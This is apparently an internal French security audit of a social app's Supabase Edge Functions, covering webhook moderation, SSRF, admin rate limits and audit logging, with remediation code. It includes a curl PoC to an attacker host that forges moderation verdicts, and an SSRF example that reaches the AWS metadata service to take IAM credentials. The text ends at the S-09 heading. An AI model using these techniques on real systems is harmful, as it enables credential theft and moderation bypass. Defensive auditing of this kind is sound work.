# Audit Sécurité — Section Social

**Date :** 2026-05-19
**Périmètre :** 20 Edge Functions `social-*`, migrations SQL & RLS sociales, frontend (services, screens, hooks, components), storage bucket `social-posts` (reservations + image hardening).
**Complément à :** [BACKEND_SECURITY_AUDIT.md](BACKEND_SECURITY_AUDIT.md), [FRONTEND_SECURITY_AUDIT.md](FRONTEND_SECURITY_AUDIT.md), [XSS_HTML_SECURITY_AUDIT.md](XSS_HTML_SECURITY_AUDIT.md), [SETTINGS_ADMIN_SECURITY_AUDIT.md](SETTINGS_ADMIN_SECURITY_AUDIT.md), [TRUST_BOUNDARIES.md](TRUST_BOUNDARIES.md), [SECURITY_AUDIT_SUPABASE.md](SECURITY_AUDIT_SUPABASE.md).

---

## Résumé exécutif

La feature **social** est la surface la plus exposée de l'app : contenu utilisateur (texte + image), graphe public (feed, follows, profils), pipeline de modération asynchrone via webhook n8n, panneau admin destructeur (eradicate, ban, adjust reactions). Cet audit couvre **20 Edge Functions**, **20+ migrations SQL** (incluant RLS, triggers, RPC SECURITY DEFINER), le **storage bucket** `social-posts` avec son système de réservation, et l'ensemble du **frontend social** (services, hooks React Query, screens, components).

**Posture globale : mature.** Defense-in-depth visible partout (RLS dur + RPC `service_role`-only + checks app-layer redondants), HMAC outbound, `normalizeSocialText` robuste contre XSS / control chars / bidi / schemes dangereux, EXIF strip et pixel budget sur les uploads, account_tier protégé par policy + trigger. Les findings ci-dessous portent sur des **angles morts résiduels** et des **failles d'amplification** en cas de compromission d'un compte admin ou du worker n8n.

| Sévérité | Total | Findings |
|----------|-------|----------|
| **P0 — Critique** | 2 | S-01, S-02 |
| **P1 — Haut** | 6 | S-04, S-05, S-07, S-08, S-09, S-15 |
| **P2 — Moyen** | 5 | S-10, S-11, S-12, S-13, S-14 |
| **P3 — Faible** | 3 | S-16, S-17, S-18 |
| ℹ️ Référence | 2 | S-03 (contrôle positif), S-06 (risque accepté MFA) |

### Actions prioritaires

1. **P0 — S-01** : Ajouter une vérification HMAC sur la **réponse** du webhook n8n de modération ([social-report-content/index.ts:187](supabase/functions/social-report-content/index.ts:187)). Aujourd'hui un MITM ou un DNS-rebind peut renvoyer `{"workflow_status":"dismissed"}` → bypass complet de la modération.
2. **P0 — S-02** : Résoudre le DNS du host webhook et rejeter les ranges RFC 1918 / loopback / link-local après validation de l'allowlist ([webhookHostAllowlist.ts:54-102](supabase/functions/_shared/webhookHostAllowlist.ts:54)).
3. **P1 — S-04 + S-05** : Faire fail-closed le rate limit admin + l'audit log admin. Aujourd'hui un admin compromis sur une BDD dégradée échappe simultanément au rate limit et au logging.
4. **P1 — S-15** : Borner les `admin_*_adjustment` côté RPC et CHECK constraint (actuellement aucune limite serveur → risque d'overflow integer + manipulation feed).

---

## Modèle de menace

| Acteur | Capacités | Surface principale |
|--------|-----------|--------------------|
| **User authentifié AAL1** | JWT valide, AAL1 (password-only — MFA désactivée par décision produit, voir [TRUST_BOUNDARIES.md](TRUST_BOUNDARIES.md) §"Accepted residual risk: AAL1-only") | Toutes les Edge Functions sociales, RLS posts/comments/likes |
| **User banni** | Tentatives de contournement via account-switch ou multi-comptes | `is_user_banned` RPC + auto-hide via brigading (S-12) |
| **Compte admin compromis** | Accès à `social-admin-*` (eradicate, ban, adjust reactions) | S-04, S-05, S-09, S-15 amplifient l'impact |
| **MITM / DNS rebind** | Interception réseau ou contrôle DNS d'un domaine allowlisté | S-01, S-02 (webhook n8n) |
| **Worker n8n compromis** | Contrôle des réponses du pipeline de modération | S-01 (webhook response signature) |
| **Brigading coordonné** | 3+ comptes coordonnés (ou comptes neufs) | S-12 (auto-hide à 3 reports/24h) |

**Hors scope** : Audit du worker n8n lui-même (autre repo). Audit du processus RevenueCat (déjà couvert dans `BACKEND_SECURITY_AUDIT.md`).

---

## Findings détaillés

### S-01 — Webhook N8N de modération : réponse non vérifiée [P0 — Critique]

**Fichier :** [supabase/functions/social-report-content/index.ts:174-204](supabase/functions/social-report-content/index.ts:174)

```ts
if (reportWebhookUrl) {
  const webhookResult = await postWebhookJson(reportWebhookUrl, { ... });

  if (webhookResult.ok) {
    workflowStatus =
      readOptionalString(webhookResult.payload?.workflow_status) ?? 'reviewing';

    await supabase
      .from('social_reports')
      .update({
        workflow_status: workflowStatus,
        moderation_provider:
          readOptionalString(webhookResult.payload?.moderation_provider) ?? 'n8n',
        moderation_reason:
          readOptionalString(webhookResult.payload?.moderation_reason) ?? null,
        moderation_summary_json: summarizeProviderPayload(webhookResult.payload, { ... }),
      })
      .eq('id', createdReport.id);
  }
}
```

**Description.** La requête sortante vers n8n est correctement HMAC-signée via `buildPhase2WebhookHeaders` ([phase2Webhook.ts:57-91](supabase/functions/_shared/phase2Webhook.ts:57)). **En revanche, la réponse de n8n n'est jamais vérifiée.** Les champs `workflow_status`, `moderation_provider`, `moderation_reason` retournés par le webhook sont écrits **directement en base** sans signature, sans timestamp, sans nonce.

**Exploitation.** Trois vecteurs réalistes :

1. **MITM sur le canal sortant.** Si le canal vers n8n n'est pas TLS strict (ou en cas de fuite de certificat), l'attaquant intercepte la requête et renvoie `{"workflow_status":"dismissed","moderation_provider":"n8n","moderation_reason":"clean"}`.
2. **DNS rebinding sur `N8N_SOCIAL_REPORT_WEBHOOK_URL`.** Combiné avec S-02 (pas de filtrage IP privée), un sous-domaine contrôlé par l'attaquant peut résoudre vers un serveur malveillant.
3. **Compromission du worker n8n lui-même.** Un attaquant qui prend la main sur n8n peut décider arbitrairement quels reports sont `dismissed`.

```bash
# PoC (simulé en local) avec un n8n attaquant qui force dismiss
curl -X POST https://n8n.attacker.com/webhook/social-report \
  -d '{"workflow_status":"dismissed","moderation_provider":"n8n"}'
```

→ Tous les reports légitimes sont automatiquement classés "dismissed" sans review humain.

**Impact.**
- Bypass complet du pipeline de modération (harcèlement, spam, contenu illégal jamais traités).
- Aucune trace côté `social_moderation_events` (pas d'action admin), seule signature : `moderation_provider = 'n8n'` sur des reports artificiellement résolus.
- Risque réputationnel et légal majeur (contenu illégal non modéré).

**Recommandation.** Vérifier une signature HMAC sur la **réponse** webhook avec le même pattern que `requireSocialModerationWorkerSignature` ([phase2Auth.ts:359](supabase/functions/_shared/phase2Auth.ts:359)). Extrait à appliquer dans [phase2Webhook.ts](supabase/functions/_shared/phase2Webhook.ts) :

```ts
// 1) Ajouter dans postWebhookJson — vérifier la signature de la réponse :
import { timingSafeEqual } from './phase2Auth.ts';

const PHASE2_WEBHOOK_RESPONSE_SIGNATURE_HEADER = 'x-webhook-response-signature';
const PHASE2_WEBHOOK_RESPONSE_TIMESTAMP_HEADER = 'x-webhook-response-timestamp';
const PHASE2_WEBHOOK_RESPONSE_TOLERANCE_MS = 5 * 60 * 1000;

async function verifyWebhookResponseSignature(
  response: Response,
  rawText: string,
  secret: string,
): Promise<void> {
  const sig = response.headers.get(PHASE2_WEBHOOK_RESPONSE_SIGNATURE_HEADER);
  const ts = response.headers.get(PHASE2_WEBHOOK_RESPONSE_TIMESTAMP_HEADER);
  if (!sig || !ts) {
    throw new Phase2HttpError(502, 'webhook_response_unsigned',
      'Webhook response is missing signature headers');
  }
  const tsMs = Date.parse(ts);
  if (!Number.isFinite(tsMs) || Math.abs(Date.now() - tsMs) > PHASE2_WEBHOOK_RESPONSE_TOLERANCE_MS) {
    throw new Phase2HttpError(502, 'webhook_response_stale',
      'Webhook response timestamp outside the allowed window');
  }
  const expected = await createPhase2WebhookSignature(ts, rawText, secret);
  if (!timingSafeEqual(sig, expected)) {
    throw new Phase2HttpError(502, 'webhook_response_invalid_signature',
      'Webhook response signature mismatch');
  }
}

// 2) Dans postWebhookJson, après `await response.text()` :
if (authConfig.useHmac) {
  await verifyWebhookResponseSignature(response, text, authConfig.hmacSecret!);
}
```

Côté n8n : configurer le workflow pour signer la réponse avec le même secret HMAC (ou un secret dédié `N8N_RESPONSE_HMAC_SECRET`).

**Statut :** ✅ Corrigé 2026-05-19 (Wave 1, PR #2). [phase2Webhook.ts:verifyPhase2WebhookResponseSignature](supabase/functions/_shared/phase2Webhook.ts) ajouté, vérification HMAC inbound activée par défaut quand l'auth mode outbound inclut `hmac`. Kill-switch `WEBHOOK_VERIFY_RESPONSE=false` disponible pour rollback urgent. Tests : `S-01:*` dans [phase2Webhook.test.ts](supabase/functions/_shared/phase2Webhook.test.ts).

---

### S-02 — Webhook host allowlist sans validation IP (SSRF par DNS rebinding) [P0 — Critique]

**Fichier :** [supabase/functions/_shared/webhookHostAllowlist.ts:54-102](supabase/functions/_shared/webhookHostAllowlist.ts:54)

```ts
export function validateWebhookUrl(rawUrl: string): WebhookUrlValidationResult {
  let parsed: URL;
  try {
    parsed = new URL(rawUrl);
  } catch {
    return { ok: false, reason: 'invalid_url' };
  }
  // ... vérification du protocole https + allowlist hostname uniquement
  const hostname = parsed.hostname.toLowerCase();
  for (const allowed of allowedHosts) {
    if (hostMatches(allowed, hostname)) {
      return { ok: true, url: parsed };  // ❌ aucune résolution DNS
    }
  }
  return { ok: false, reason: 'host_not_allowed', details: { hostname } };
}
```

**Description.** L'allowlist filtre par **hostname string uniquement** : match exact ou wildcard `*.domain.com`. Aucune résolution DNS post-validation. Conséquence :

1. Un host allowlisté peut résoudre vers une IP privée RFC 1918 (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), loopback (127.0.0.0/8), link-local (169.254.0.0/16 — AWS metadata service !), ou multicast.
2. La résolution DNS est faite par `fetch()` au moment de la requête, pas au moment de la validation → **DNS rebinding** : un domaine résout vers une IP publique à la validation, puis vers `127.0.0.1` à la requête.

**Exploitation.**

```ts
// Si WEBHOOK_ALLOWED_HOSTS contient `*.ngrok.io` (cas typique de dev → prod par erreur)
const attackerDomain = 'attacker.ngrok.io';
// L'attaquant configure :
//   attacker.ngrok.io → A 127.0.0.1 (loopback)
//   ou attacker.ngrok.io → A 169.254.169.254 (AWS metadata)
//
// L'Edge Function fait fetch('https://attacker.ngrok.io/...') → loopback
// → accès à un service interne Supabase Edge / metadata cloud → exfiltration credentials IAM
```

Particulièrement critique si Supabase Edge tourne dans un VPC avec services internes (Redis, BDD privée, metadata service AWS/GCP/Azure).

**Impact.**
- Exfiltration de credentials cloud (AWS IAM via `169.254.169.254/latest/meta-data/iam/security-credentials/`).
- Accès à des services internes non exposés publiquement (Redis sans auth, BDD admin, etc.).
- Pivot vers une compromission complète de l'infrastructure.

**Recommandation.** Après la validation hostname, résoudre via `Deno.resolveDns()` et vérifier que toutes les IPs résolues sont publiques. Extrait à ajouter dans [webhookHostAllowlist.ts](supabase/functions/_shared/webhookHostAllowlist.ts) :

```ts
// CIDR ranges à bloquer (RFC 1918, loopback, link-local, multicast, reserved)
const PRIVATE_IPV4_RANGES: ReadonlyArray<[bigint, bigint]> = [
  // 10.0.0.0/8
  [ipv4ToBigInt('10.0.0.0'), ipv4ToBigInt('10.255.255.255')],
  // 172.16.0.0/12
  [ipv4ToBigInt('172.16.0.0'), ipv4ToBigInt('172.31.255.255')],
  // 192.168.0.0/16
  [ipv4ToBigInt('192.168.0.0'), ipv4ToBigInt('192.168.255.255')],
  // 127.0.0.0/8 — loopback
  [ipv4ToBigInt('127.0.0.0'), ipv4ToBigInt('127.255.255.255')],
  // 169.254.0.0/16 — link-local (AWS/Azure metadata)
  [ipv4ToBigInt('169.254.0.0'), ipv4ToBigInt('169.254.255.255')],
  // 224.0.0.0/4 — multicast
  [ipv4ToBigInt('224.0.0.0'), ipv4ToBigInt('239.255.255.255')],
  // 0.0.0.0/8 — "this network"
  [ipv4ToBigInt('0.0.0.0'), ipv4ToBigInt('0.255.255.255')],
];

function ipv4ToBigInt(ip: string): bigint {
  return ip.split('.').reduce((acc, oct) => (acc << 8n) | BigInt(Number(oct)), 0n);
}

function isPrivateIpv4(ip: string): boolean {
  const value = ipv4ToBigInt(ip);
  return PRIVATE_IPV4_RANGES.some(([lo, hi]) => value >= lo && value <= hi);
}

function isPrivateIpv6(ip: string): boolean {
  // ::1 (loopback), fc00::/7 (unique-local), fe80::/10 (link-local)
  const lower = ip.toLowerCase();
  return (
    lower === '::1' ||
    lower.startsWith('fc') || lower.startsWith('fd') ||
    lower.startsWith('fe80:') || lower.startsWith('fe9') ||
    lower.startsWith('fea') || lower.startsWith('feb')
  );
}

export async function assertWebhookHostResolvesPublic(hostname: string): Promise<void> {
  const isLocalDev = readAllowHttp() && LOCALHOST_HOSTNAMES.has(hostname.toLowerCase());
  if (isLocalDev) return; // OK en dev local explicite

  let aRecords: string[] = [];
  let aaaaRecords: string[] = [];
  try {
    aRecords = await Deno.resolveDns(hostname, 'A');
  } catch { /* pas d'A record → on essaie AAAA */ }
  try {
    aaaaRecords = await Deno.resolveDns(hostname, 'AAAA');
  } catch { /* pas d'AAAA non plus */ }

  if (aRecords.length === 0 && aaaaRecords.length === 0) {
    throw new Phase2HttpError(502, 'webhook_dns_resolution_failed',
      `Hostname ${hostname} did not resolve to any A/AAAA record`);
  }
  for (const ip of aRecords) {
    if (isPrivateIpv4(ip)) {
      throw new Phase2HttpError(502, 'webhook_host_resolves_private',
        `Hostname ${hostname} resolved to a private IPv4 (${ip})`);
    }
  }
  for (const ip of aaaaRecords) {
    if (isPrivateIpv6(ip)) {
      throw new Phase2HttpError(502, 'webhook_host_resolves_private',
        `Hostname ${hostname} resolved to a private IPv6 (${ip})`);
    }
  }
}
```

Puis appeler `await assertWebhookHostResolvesPublic(parsed.hostname)` dans `validateWebhookUrl` avant de retourner `{ ok: true }`. Le coût est ~5ms de DNS, et la résolution est cachée par le runtime sur les appels successifs (mitige le DNS rebinding pour quelques minutes).

**Note résiduelle.** Le DNS rebinding peut encore survenir entre `assertWebhookHostResolvesPublic` et le `fetch()` final (~quelques ms de fenêtre). Mitigation complète : utiliser une lib qui résout puis fetch en hardcodant l'IP (rare en Deno). Le contrôle proposé couvre 99% des scénarios.

**Statut :** ✅ Corrigé 2026-05-19 (Wave 1, PR #1). [webhookHostAllowlist.ts:resolveWebhookHostPublic](supabase/functions/_shared/webhookHostAllowlist.ts) résout DNS + bloque IPv4/IPv6 privées (RFC 1918, loopback, link-local, multicast, CGNAT, test-nets, broadcast). Vérification appelée depuis `postWebhookJson` juste avant `fetch()`. Kill-switch `WEBHOOK_ALLOW_PRIVATE_IPS=true` disponible pour dev. Tests : [webhookHostAllowlist.test.ts](supabase/functions/_shared/webhookHostAllowlist.test.ts) + `S-02:*` dans [phase2Webhook.test.ts](supabase/functions/_shared/phase2Webhook.test.ts).

---

### S-03 — Mass-assignment sur les inserts/updates sociaux [ℹ️ Contrôle positif observé]

**Fichiers vérifiés :**
- [supabase/functions/social-create-post/index.ts:210-225](supabase/functions/social-create-post/index.ts:210)
- [supabase/functions/social-create-comment/index.ts:132-144](supabase/functions/social-create-comment/index.ts:132)
- [supabase/functions/social-update-comment/index.ts:156-172](supabase/functions/social-update-comment/index.ts:156)
- [supabase/functions/social-report-content/index.ts:87-142](supabase/functions/social-report-content/index.ts:87)
- [supabase/functions/social-admin-adjust-post-reactions/index.ts:162-178](supabase/functions/social-admin-adjust-post-reactions/index.ts:162)

**Description.** L'audit `BACKEND_SECURITY_AUDIT.md` B-07 mentionnait `social_comments` comme exemple de risque de mass assignment. **Vérification post-audit : tous les Edge Functions sociaux utilisent un `parseSocial*Request` qui appelle `assertNoUnknownKeys`** ([phase2Utils.ts:116-132](supabase/functions/_shared/phase2Utils.ts:116)) avant l'insert/update, et chaque insert liste explicitement les champs autorisés. Aucun spread d'objet `requestBody` directement dans un `.insert()` ou `.update()` n'a été trouvé.

Le seul spread observé (`...initialModerationFields` dans `social-create-post:225` et `social-create-comment:142`, `...moderationFields` dans `social-update-comment:166`) provient de `buildInitialSocialModerationFields()`, fonction serveur sans entrée utilisateur.

**Statut :** ✅ Aucune action requise. Contrôle positif documenté dans la section ad hoc.

---

### S-04 — Rate limit admin fail-open en cas d'erreur DB [P1 — Haut]

**Fichier :** [supabase/functions/_shared/phase2Auth.ts:518-554](supabase/functions/_shared/phase2Auth.ts:518)

```ts
export async function enforceAdminRateLimit(client, options) {
  const since = new Date(Date.now() - options.windowMs).toISOString();
  const { count, error } = await client
    .from('admin_audit_events')
    .select('id', { count: 'exact', head: true })
    .eq('actor_id', options.actorId)
    .like('action', options.actionPattern)
    .gte('created_at', since);

  if (error) {
    // En cas d'echec de la lecture du compteur, on log et on laisse passer
    // l'action (fail-open). Bloquer un admin legitime sur un probleme reseau
    // serait pire que d'autoriser N+1 actions.
    console.error('[phase2Auth] Failed to read admin_audit_events for rate limit', error);
    return;  // ❌ fail-open
  }
  // ...
}
```

**Description.** Si la lecture de `admin_audit_events` échoue (timeout réseau, RLS bloquée, DB saturée, table verrouillée), `enforceAdminRateLimit` retourne silencieusement → l'admin peut effectuer un **nombre illimité** d'actions destructives dans cette fenêtre.

**Exploitation.** Scénario combiné :
1. Attaquant compromet un compte admin (phishing, password reuse — rappel : MFA désactivée, S-06).
2. Provoque une dégradation BDD (charge légitime ou DoS partiel sur `admin_audit_events` via inflation log).
3. Lance un script qui spam `social-admin-eradicate-user` ou `social-admin-adjust-post-reactions` : tant que la lecture du compteur échoue, aucune limite.

Le tradeoff documenté dans le code privilégie la disponibilité de l'admin légitime sur la sécurité. Cette priorisation est **inversée** pour des actions destructives non-réversibles (eradicate user content).

**Impact.**
- Wipe massif de contenu utilisateur (eradicate) sans plafond.
- Manipulation massive des compteurs de réactions (S-15) → manipulation feed.
- Aggravé par S-05 (audit log silent failure) : pas de trace de la rampe.

**Recommandation.** Fail-closed sur les actions destructives, fail-open documenté uniquement sur les actions non-destructives (`approve`, `dismiss_reports`). Extrait à appliquer dans [phase2Auth.ts:518](supabase/functions/_shared/phase2Auth.ts:518) :

```ts
export async function enforceAdminRateLimit(
  client: any,
  options: {
    actorId: string;
    actionPattern: string;
    maxActions: number;
    windowMs: number;
    failOpenOnError?: boolean; // ← nouveau, default false
  },
): Promise<void> {
  const since = new Date(Date.now() - options.windowMs).toISOString();
  const { count, error } = await client
    .from('admin_audit_events')
    .select('id', { count: 'exact', head: true })
    .eq('actor_id', options.actorId)
    .like('action', options.actionPattern)
    .gte('created_at', since);

  if (error) {
    console.error('[phase2Auth] Failed to read admin_audit_events for rate limit', error);
    if (options.failOpenOnError) {
      return; // explicite pour les actions non-destructrices uniquement
    }
    throw new Phase2HttpError(
      503,
      'admin_rate_limit_unavailable',
      'Admin rate limit cannot be evaluated; retry in a moment.',
    );
  }

  if ((count ?? 0) >= options.maxActions) {
    throw new Phase2HttpError(
      429,
      'admin_rate_limit_exceeded',
      `Admin rate limit exceeded: ${options.maxActions} ${options.actionPattern} per ${options.windowMs / 60000} minutes`,
    );
  }
}
```

Et imposer `failOpenOnError: false` (default) sur **toutes** les Edge Functions `social-admin-*` qui appellent eradicate / adjust / ban / remove.

**Statut :** ✅ Corrigé 2026-05-19 (Wave 2, PR #5). [phase2Auth.ts:enforceAdminRateLimit](supabase/functions/_shared/phase2Auth.ts) accepte désormais `failOpenOnError` (défaut `false`). En cas d'erreur DB, lève `503 admin_rate_limit_unavailable` au lieu de laisser passer silencieusement. Les actions non-destructrices peuvent opt-in via `failOpenOnError: true` explicite.

---

### S-05 — Audit log admin best-effort (silent failure) [P1 — Haut]

**Fichier :** [supabase/functions/_shared/phase2Auth.ts:488-511](supabase/functions/_shared/phase2Auth.ts:488)

```ts
export async function logAdminAuditEvent(client, options): Promise<void> {
  try {
    await client.from('admin_audit_events').insert({
      actor_id: options.actorId,
      action: options.action,
      request_id: options.requestId ?? null,
      metadata: options.metadata ?? {},
    });
  } catch (error) {
    // Audit log failures must not break the underlying admin action — they
    // surface in observability (logPhase2Error) instead.
    console.error('[phase2Auth] Failed to write admin_audit_events row', error);
    // ❌ pas de re-throw
  }
}
```

**Description.** Toute erreur d'insertion dans `admin_audit_events` est avalée silencieusement. Combiné avec S-04 (le même compteur sert au rate limit), une dégradation de cette table laisse les actions admin :
1. S'exécuter sans audit trail (aucune trace post-mortem).
2. Bypass le rate limit (S-04).

L'ordre des opérations actuel est : action exécutée → audit log écrit (best-effort). Donc même en fail-closed sur S-04, une fois l'action partie, si l'insertion audit échoue, on perd la trace.

**Exploitation.** Attaquant qui a compromis un compte admin et qui souhaite agir sans laisser de trace :
1. Provoque une saturation de `admin_audit_events` (via une autre Edge Function admin qui écrit beaucoup ou via DoS DB).
2. Lance `social-admin-eradicate-user` sur ses cibles.
3. Audit log échoue → console.error uniquement → aucune trace structurée.

**Impact.**
- Suppression totale de la traçabilité des actions destructives.
- Réinvestigation post-incident impossible.
- Compliance (GDPR, SOC 2) compromise sur la partie "audit trail des accès privilégiés".

**Recommandation.** Écrire l'audit log **avant** l'action destructive et faire fail-closed si l'insertion échoue. Pattern à appliquer dans chaque Edge Function `social-admin-*` :

```ts
// Avant l'appel à la RPC destructrice :
await logAdminAuditEvent(supabase, {
  actorId: user.id,
  action: 'social_admin_eradicate_user.intent', // marque l'intention
  requestId,
  metadata: { target_user_id: requestBody.target_user_id },
});
// Si l'insert audit échoue, on doit lever (modifier logAdminAuditEvent) :
```

Modifier [logAdminAuditEvent](supabase/functions/_shared/phase2Auth.ts:488) :

```ts
export async function logAdminAuditEvent(
  client: any,
  options: { actorId: string; action: string; requestId?: string | null; metadata?: Record<string, unknown>; critical?: boolean; },
): Promise<void> {
  try {
    const { error } = await client.from('admin_audit_events').insert({
      actor_id: options.actorId,
      action: options.action,
      request_id: options.requestId ?? null,
      metadata: options.metadata ?? {},
    });
    if (error) throw error;
  } catch (error) {
    console.error('[phase2Auth] Failed to write admin_audit_events row', error);
    if (options.critical !== false) {
      // Default : critical=true. Lève sauf si explicitement déclaré non-critique.
      throw new Phase2HttpError(
        503,
        'admin_audit_log_unavailable',
        'Admin audit log cannot be written; admin action refused.',
      );
    }
  }
}
```

Puis passer `critical: true` (default) sur eradicate / adjust / ban / remove. Les actions de modération courante (`approve`, `dismiss`) peuvent rester `critical: false`.

**Statut :** ✅ Corrigé 2026-05-19 (Wave 2, PR #6). [phase2Auth.ts:logAdminAuditEvent](supabase/functions/_shared/phase2Auth.ts) accepte désormais `critical` (défaut `true`). En cas d'échec d'insertion, lève `503 admin_audit_log_unavailable` par défaut. Les actions non-destructrices peuvent opt-in via `critical: false` (legacy best-effort). Combiné à S-09, garantit "pas d'action destructive sans audit trail".

---

### S-06 — AAL2 / MFA désactivée — multiplicateur de risque [ℹ️ Risque accepté documenté]

**Fichier :** [supabase/functions/_shared/phase2Auth.ts:101-130](supabase/functions/_shared/phase2Auth.ts:101)

```ts
function assertAal2BearerToken(_token: string) {
  // MFA / AAL2 a ete retiree de l'app (decision produit). Cette verification
  // etait appelee par requireAuthenticatedUser pour bloquer les sessions AAL1
  // sur les operations sensibles. Avec la suppression de la MFA, AAL1 est le
  // niveau maximum atteignable et ce check ferait crasher toutes les Edge
  // Functions qui l'appellent. On neutralise sans supprimer la fonction pour
  // garder requireAuthenticatedUser fonctionnelle sans toucher aux call-sites.
  // [...]
  // ACCEPTED RISK 2026-05 (post-Shannon pentest, finding AUTH-VULN-07): [...]
}
```

**Description.** No-op explicite documenté comme **risque résiduel accepté** dans `TRUST_BOUNDARIES.md` et `SECURITY_AUDIT_SUPABASE.md`. Toute session AAL1 (password-only, 8 caractères avec lowercase+digit) accède aux 34 Edge Functions authentifiées, incluant `social-admin-*`.

**Rappel pour cet audit.** Sans constituer un nouveau finding, l'absence de MFA est un **multiplicateur de risque** pour :
- S-04 (rate limit admin fail-open) — un compte admin compromis est plus probable.
- S-05 (audit log silent) — idem.
- S-09 (eradication non-idempotente) — un attaquant disposant d'un compte admin peut spammer plus facilement.

**Contrôles compensatoires en place** (cf. `SECURITY_FIX_PLAN_2026_05.md` Waves 1-3) :
- Per-account login lockout (auth-pre-login hook + RPCs)
- Secure-signup wrapper + nonce trigger
- Email verification gate (`user_profiles.email_verified`)
- Password policy 8 chars min, lowercase + digit, HIBP check

**Recommandation.** Pas d'action immédiate (décision produit). À reconsidérer si l'un des findings S-04/S-05/S-09 ne peut être pleinement corrigé.

**Statut :** ℹ️ Risque accepté documenté. Réévaluer si nouveau pentest.

---

### S-07 — Frontend admin : pas de re-vérification serveur du tier au chargement [P1 — Haut]

**Fichier :** [screens/AdminSocialModerationScreen.tsx:123-942](screens/AdminSocialModerationScreen.tsx:123)

```tsx
const isAdmin = userProfile?.account_tier === 'admin';
// [...]
if (!isAdmin) {
  return <ScreenState tone="loading" layout="full" testID="admin-social-redirecting" />;
}
```

**Description.** Le gating UI repose sur le `userProfile.account_tier` issu de l'AuthContext (lui-même issu d'un fetch initial sur `user_profiles`). Le **serveur revérifie correctement** via `requireAdminUserProfile` ([phase2Auth.ts:466](supabase/functions/_shared/phase2Auth.ts:466)) sur chaque Edge Function admin, donc le risque d'IDOR effectif est nul.

**Mais** :
1. L'UI expose la structure des écrans admin et les payloads attendus à un attaquant disposant d'un debugger.
2. L'absence d'endpoint dédié `whoami` empêche de **invalider la session** côté serveur si le tier change (ex : démotion d'un admin pendant qu'il a l'UI ouverte → il continue à appeler les endpoints jusqu'au premier 403).
3. Le composant `useSocialAdminModeration` ([hooks/queries/useSocialAdminModeration.ts](hooks/queries/useSocialAdminModeration.ts)) charge la queue de modération dès le mount → fuite potentielle de contenu sensible (posts flagged) si l'UI est rendue brièvement avant le redirect.

**Exploitation.** Attaquant patche `userProfile.account_tier` en mémoire via React DevTools / debug bridge :
- Voit l'UI admin pendant ~1 seconde avant le 403 → fingerprint des endpoints.
- Lit la queue de modération si elle est rendue avant le check (race condition côté React).

**Recommandation.** Ajouter un endpoint `admin-whoami` qui retourne 403 si non-admin, et conditionner le rendu de l'écran sur sa réussite (utiliser `useQuery` avec `enabled` et `Suspense` boundary). Extrait :

```ts
// Nouvelle Edge Function supabase/functions/admin-whoami/index.ts
Deno.serve(async (req: Request) => {
  if (req.method === 'OPTIONS') return handleCorsPreflightRequest(req);
  const corsError = validateCorsOrigin(req);
  if (corsError) return corsError;
  try {
    const supabase = createServiceRoleClient();
    const user = await requireAuthenticatedUser(supabase, req);
    const profile = await requireAdminUserProfile(supabase, user.id);
    return jsonResponse(req, { is_admin: true, user_id: profile.id });
  } catch (error) {
    return jsonResponse(req, toPhase2ErrorPayload(error, {}), {
      status: getPhase2ErrorStatus(error),
    });
  }
});
```

```tsx
// screens/AdminSocialModerationScreen.tsx
import { useAdminWhoami } from 'hooks/queries/useAdminWhoami';

const adminCheck = useAdminWhoami();

if (adminCheck.isLoading) {
  return <ScreenState tone="loading" layout="full" testID="admin-social-loading" />;
}
if (adminCheck.isError || !adminCheck.data?.is_admin) {
  return <ScreenState tone="error" layout="full" testID="admin-social-forbidden" />;
}

// ← le reste de l'écran uniquement si admin confirmé serveur
```

**Statut :** ✅ Corrigé 2026-05-19 (Wave 2, PR #8). Nouvelle Edge Function [admin-whoami/index.ts](supabase/functions/admin-whoami/index.ts) qui revérifie côté serveur le tier admin. Nouveau hook [useAdminWhoami](hooks/queries/useAdminWhoami.ts) appelé par [AdminSocialModerationScreen.tsx](screens/AdminSocialModerationScreen.tsx). L'écran admin n'est rendu que si `clientSideIsAdmin && adminWhoamiQuery.data?.is_admin === true` (les deux checks doivent passer).

---

### S-08 — `shouldAutoHideForReports` : threshold paramétrable par les callers [P1 — Haut]

**Fichier :** [supabase/functions/_shared/phase2Moderation.ts:100-105](supabase/functions/_shared/phase2Moderation.ts:100)

```ts
export function shouldAutoHideForReports(
  uniqueReportCount24h: number,
  threshold = 3,  // ❌ paramètre exposé
) {
  return uniqueReportCount24h >= threshold;
}
```

**Description.** Le seuil d'auto-hide (3 reports uniques en 24h) est passé en paramètre par défaut. Aucune validation : un caller pourrait passer `threshold = 0` (auto-hide immédiat sur 1 seul report) ou `Infinity` (jamais d'auto-hide). Actuellement un seul caller (`social-report-content/index.ts:184`) passe `3` explicitement → impact pratique aujourd'hui ≈ 0.

**Pourquoi P1.** Une modification innocente (refactor, ajout d'une feature flag, A/B testing) qui propage le `threshold` paramétrable jusqu'à une entrée utilisateur ou un endpoint admin amplifie immédiatement les findings S-12 (brigading) ou inverse le sens (ne jamais auto-hide).

**Recommandation.** Supprimer le paramètre, hardcoder la constante. Si une variation est nécessaire dans le futur, passer par une feature flag explicite. Extrait :

```ts
// phase2Moderation.ts
export const SOCIAL_AUTO_HIDE_THRESHOLD = 3;

export function shouldAutoHideForReports(uniqueReportCount24h: number): boolean {
  // Validation défensive : compteur doit être un entier positif.
  if (!Number.isFinite(uniqueReportCount24h) || uniqueReportCount24h < 0) {
    return false;
  }
  return uniqueReportCount24h >= SOCIAL_AUTO_HIDE_THRESHOLD;
}
```

Mettre à jour les callers (un seul aujourd'hui) :

```ts
// social-report-content/index.ts:184
auto_hidden: shouldAutoHideForReports(reportCount24h),  // ← sans 2e arg
```

Ajouter un test de régression dans `phase2Moderation.test.ts` qui grep `shouldAutoHideForReports.*,` (virgule = 2e arg passé) pour bloquer toute réintroduction du paramètre.

**Statut :** ✅ Corrigé 2026-05-19 (Wave 2, PR #3). [phase2Moderation.ts:shouldAutoHideForReports](supabase/functions/_shared/phase2Moderation.ts) ne prend plus qu'un seul paramètre (`uniqueReportCount24h`). Le seuil est exporté comme constante `SOCIAL_AUTO_HIDE_THRESHOLD = 3`. Validation défensive sur l'input (rejette `NaN`/`Infinity`/négatifs). Test de régression dans [phase2Moderation.test.ts](supabase/functions/_shared/phase2Moderation.test.ts) qui vérifie `shouldAutoHideForReports.length === 1`.

---

### S-09 — Eradication user : pas d'idempotency key [P1 — Haut]

**Fichier :** [supabase/migrations/20260418173000_social_admin_eradication_and_reaction_adjustments.sql:499](supabase/migrations/20260418173000_social_admin_eradication_and_reaction_adjustments.sql:499)

